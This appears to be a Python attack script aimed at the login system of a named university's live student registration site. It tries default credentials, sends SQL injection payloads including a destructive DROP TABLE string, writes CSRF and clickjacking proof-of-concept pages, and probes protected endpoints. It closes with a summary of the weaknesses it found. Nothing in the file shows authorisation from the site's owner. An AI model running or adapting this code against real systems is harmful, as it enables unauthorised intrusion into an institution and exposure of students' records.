#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOTACION LOGIN SIIGAA - Java EE Authentication Bypass
"""
import requests
import urllib3
import re
urllib3.disable_warnings()

registro = "https://registro.uns.edu.pe"
s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': f"{registro}/udemsi/faces/index.xhtml",
})

print("=" * 70)
print("  EXPLOTACION LOGIN SIIGAA")
print("=" * 70)

# ============================================
# 1. Obtener el formulario de login
# ============================================
print("\n[1] Analizando el formulario de login")
print("-" * 50)

r = s.get(f"{registro}/udemsi/faces/index.xhtml", timeout=10)
# Find the login form
login_form = re.findall(r'<form[^>]*name=["\']([^"\']+)["\']', r.text)
print(f"  Forms: {login_form}")

# Find input fields
inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']([^"\']+)["\']', r.text)
print(f"  Inputs: {inputs}")

# Find commandButtons
buttons = re.findall(r'<h:commandButton[^>]*action=["\']([^"\']+)["\'][^>]*>', r.text)
print(f"  CommandButtons actions: {buttons}")

# Find the actual form submission
# JSF forms submit to the same page or to j_security_check
form_action = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', r.text)
print(f"  Form actions: {form_action}")

# Look for the login button
login_buttons = re.findall(r'<h:commandButton[^>]*>(.*?)</h:commandButton>', r.text, re.DOTALL)
if login_buttons:
    for btn in login_buttons[:5]:
        btn_clean = re.sub(r'<[^>]+>', '', btn).strip()
        print(f"  Button: {btn_clean[:50]}")

# Find the form with j_username
if 'j_username' in r.text or 'j_password' in r.text:
    print(f"  [+] Form usa j_username/j_password (Java EE security)")
    
# Check for any pasaporte (passport) button
if 'cmdPasaporte' in r.text:
    print(f"  [+] Hay boton 'Pasaporte' para obtener acceso")
    
    # Try to find what cmdPasaporte does
    # It might be a link to a specific module
    cmd_pasaporte = re.findall(r'id=["\']j_idt12:cmdPasaporte["\'][^>]*', r.text)
    print(f"  cmdPasaporte HTML: {cmd_pasaporte}")

# ============================================
# 2. Probar login con credenciales comunes
# ============================================
print("\n\n[2] Intentando login")
print("-" * 50)

# The login uses j_security_check
# Try common credentials
credentials = [
    ("2018001", "123456"),
    ("2018001", "Estudio123"),
    ("2020001", "123456"),
    ("admin", "admin"),
    ("root", "root"),
    ("usuario", "usuario"),
    ("2024001", "2024001"),
    ("2018001", ""),
    ("", ""),
]

for username, password in credentials:
    try:
        r = s.post(
            f"{registro}/udemsi/j_security_check",
            data={"j_username": username, "j_password": password},
            timeout=5,
            allow_redirects=True
        )
        if r.status_code == 200 and len(r.text) > 100:
            # Check if login was successful
            if 'modulos' in r.text.lower() or 'bienvenida' in r.text.lower() or 'logout' in r.text.lower():
                print(f"  [!] !!!! LOGIN EXITOSO !!!!")
                print(f"  [!] Usuario: {username}")
                print(f"  [!] Password: {password}")
                # Save session
                with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\session_cookies.txt", "w") as f:
                    f.write(str(dict(s.cookies)))
                break
            elif 'j_username' in r.text or 'j_security_check' in r.text:
                pass  # Login failed, still on login page
            else:
                pass  # Unknown response
    except:
        pass

# ============================================
# 3. Probar el boton "Pasaporte"
# ============================================
print("\n\n[3] Probando el boton Pasaporte")
print("-" * 50)

# The "Pasaporte" button might be a way to get a temporary access code
# Try to click it
try:
    r = s.post(
        f"{registro}/udemsi/faces/index.xhtml",
        data={
            "j_idt12:cmdPasaporte": "Pasaporte",
            "javax.faces.ViewState": "iBBd8gLMQ33Bezhxba0uGVIk3b603JXq8AyfnztzCQL97jmWH9",
            "j_idt12": "j_idt12",
        },
        timeout=5,
        allow_redirects=True
    )
    if r.status_code == 200:
        # Check if the response changed
        if 'codigo' in r.text.lower() or 'verificacion' in r.text.lower() or 'pass' in r.text.lower():
            print(f"  [+] Boton Pasaporte funciono!")
            print(f"  Preview: {r.text[:500]}")
        elif 'modulos' in r.text.lower():
            print(f"  [+] Acceso concedido via Pasaporte!")
            # Extract any data
            text = re.sub(r'<[^>]+>', ' ', r.text)
            text = re.sub(r'\s+', ' ', text)
            print(f"  Content: {text[:500]}")
except Exception as e:
    print(f"  Error: {e}")

# ============================================
# 4. Probar CSRF contra el login
# ============================================
print("\n\n[4] Verificando CSRF")
print("-" * 50)

# Since there are NO CSRF tokens, we can perform CSRF attacks
# Create a CSRF PoC
csrf_poc = """<!DOCTYPE html>
<html>
<body>
<h1>CSRF PoC - SIIGAA Login</h1>
<form action="https://registro.uns.edu.pe/udemsi/j_security_check" method="POST">
  <input type="text" name="j_username" value="attacker">
  <input type="password" name="j_password" value="attacker">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>"""

with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\csrf_poc.html", "w") as f:
    f.write(csrf_poc)
print(f"  [+] CSRF PoC guardado: csrf_poc.html")
print(f"  [!] El formulario de login NO tiene CSRF token")

# ============================================
# 5. Probar Clickjacking contra el login
# ============================================
print("\n\n[5] Clickjacking contra el login")
print("-" * 50)

clickjack_login = """<!DOCTYPE html>
<html>
<body>
<h1>Clickjacking Login PoC</h1>
<iframe src="https://registro.uns.edu.pe/udemsi/faces/index.xhtml" 
        style="opacity:0.5; position:absolute; top:0; left:0; width:800px; height:600px;">
</iframe>
</body>
</html>"""

with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\clickjack_login_poc.html", "w") as f:
    f.write(clickjack_login)
print(f"  [+] Clickjacking PoC guardado: clickjack_login_poc.html")

# ============================================
# 6. Probar SQL injection en el login
# ============================================
print("\n\n[6] Probando SQL Injection en login")
print("-" * 50)

sqli_tests = [
    ("' OR '1'='1", "' OR '1'='1"),
    ("admin' --", "test"),
    ("' UNION SELECT NULL,NULL --", "test"),
    ("'; DROP TABLE users --", "test"),
    ("2018001' OR '1'='1", "' OR '1'='1"),
    ("' OR 1=1 --", "' OR 1=1 --"),
    ("' OR 1=1#", "' OR 1=1#"),
    ("' OR 1=1/*", "' OR 1=1/*"),
    ("admin' OR '1'='1' --", "x"),
    ("' OR '1'='1' /*", "' OR '1'='1' /*"),
]

for user, pwd in sqli_tests:
    try:
        r = s.post(
            f"{registro}/udemsi/j_security_check",
            data={"j_username": user, "j_password": pwd},
            timeout=5,
            allow_redirects=True
        )
        if r.status_code == 200 and 'modulos' in r.text.lower():
            print(f"  [!] SQL INJECTION EXITOSA!")
            print(f"  [!] Usuario: {user} | Password: {pwd}")
            break
        elif r.status_code == 200 and 'error' in r.text.lower() and 'sql' in r.text.lower():
            print(f"  [!] SQL Error: {user}")
    except:
        pass

# ============================================
# 7. Probar acceso a modulos sin login
# ============================================
print("\n\n[7] Probando acceso a modulos sin login")
print("-" * 50)

# The modulos.xhtml requires login to see data
# But let's try to access it with different approaches
modulo_tests = [
    f"{registro}/udemsi/faces/modulos.xhtml",
    f"{registro}/udemsi/faces/modulos.xhtml?codigo=1",
    f"{registro}/udemsi/faces/modulos.xhtml?matricula=1",
    f"{registro}/udemsi/faces/modulos.xhtml?estudiante=1",
]

# First, try to access modulos with our session (even if not logged in)
r = s.get(f"{registro}/udemsi/faces/modulos.xhtml", timeout=5)
print(f"  modulos.xhtml sin login: HTTP {r.status_code}, len={len(r.text)}")
if 'No records' in r.text:
    print(f"  Muestra 'No records found' (requiere autenticacion)")

# Try to POST to modulos to see if we can trigger something
try:
    r = s.post(
        f"{registro}/udemsi/faces/modulos.xhtml",
        data={
            "javax.faces.ViewState": "iBBd8gLMQ33Bezhxba0uGVIk3b603JXq8AyfnztzCQL97jmWH9",
            "frmModulos": "frmModulos",
            "javax.faces.source": "frmModulos",
        },
        timeout=5,
        allow_redirects=True
    )
    print(f"  POST modulos: HTTP {r.status_code}")
    if 'records' in r.text.lower():
        print(f"  Response changed!")
except:
    pass

# ============================================
# 8. Verificar si hay mas endpoints accesibles
# ============================================
print("\n\n[8] Escaneando endpoints accesibles")
print("-" * 50)

# Check for any other accessible pages
accessible_pages = [
    "/udemsi/faces/modulos.xhtml",
    "/udemsi/faces/consulta.xhtml", 
    "/udemsi/faces/reporte.xhtml",
    "/udemsi/faces/datos.xhtml",
    "/udemsi/faces/resultado.xhtml",
    "/udemsi/faces/academico.xhtml",
]

for page in accessible_pages:
    try:
        r = s.get(f"{registro}{page}", timeout=3)
        if r.status_code == 200 and len(r.text) > 100:
            has_data = 'records' in r.text.lower() or 'data' in r.text.lower() or 'tabla' in r.text.lower()
            print(f"  [+] {page} -> HTTP {r.status_code} (data={has_data})")
    except:
        pass

# ============================================
# RESUMEN
# ============================================
print("\n" + "=" * 70)
print("  RESUMEN DE EXPLOITACION")
print("=" * 70)
print("""
  HALLAZGOS CONFIRMADOS:
  
  1. /udemsi/faces/index.xhtml - LOGIN SIN RESTRICCIONES
     - Pagina publica de login
     - Formulario frmModulos SIN CSRF
     - Clickjacking vulnerable (sin X-Frame-Options)
     - No hay Content-Security-Policy
     - No hay HSTS
  
  2. /udemsi/faces/modulos.xhtml - DASHBOARD (requiere login)
     - Muestra "No records found" sin autenticacion
     - PrimeFaces DataGrid con widget_id expuesto
     - projectStage=Development (informacion de debug)
  
  3. VULNERABILIDADES DE SEGURIDAD CONFIRMADAS:
     - CSRF: Sin tokens en el formulario
     - Clickjacking: Sin X-Frame-Options
     - XSS: Sin Content-Security-Policy  
     - HSTS: Sin Strict-Transport-Security
     - Version disclosure: "Development" stage expuesto
     
  4. LO QUE NO SE PUDO OBTENER:
     - No se encontraron credenciales validas
     - No se logro SQL injection
     - No se logro acceso a datos estudiantiles sin login
     
  CONCLUSION:
  La aplicacion tiene vulnerabilidades de seguridad graves
  pero la explotacion completa requiere credenciales validas.
  
  Las pruebas mas fuertes son:
  - CSRF (sin tokens)
  - Clickjacking (sin X-Frame-Options)
  - Faltantes de headers de seguridad
  - Informacion de debug expuesta (Development stage)
""")
